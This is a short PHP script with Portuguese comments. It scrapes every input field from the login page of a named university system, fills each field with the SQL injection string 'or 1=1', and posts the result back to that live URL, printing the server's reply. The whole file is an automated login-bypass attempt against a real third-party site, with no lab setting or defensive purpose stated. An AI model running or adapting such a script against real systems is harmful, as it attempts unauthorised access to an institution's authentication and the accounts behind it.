<?php
    include_once('./simple_html_dom.php');

    // URL to GET
    $url = 'https://sistemas.cp.utfpr.edu.br/slogin/';
    // DOM a partir da URL
    $html = file_get_html($url);

    #section
    $forms = [];
    $inputs = [];

    // Todos os forms
    foreach ($html->find('form') as $form) {
        array_push($forms, $form);
    }

    // Todos inputs
    foreach($html->find('input') as $input) { 
        array_push($inputs, $input);
    }

    postRequest();

    #endsection

    function postRequest() {
        global $inputs, $url;

        $data = array();
        foreach($inputs as $input) {
            $data[$input->id] = 'or 1=1';
        }
        
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        curl_close($curl);
        echo $response;

    }

        // Finaliza execução 
        die();

?>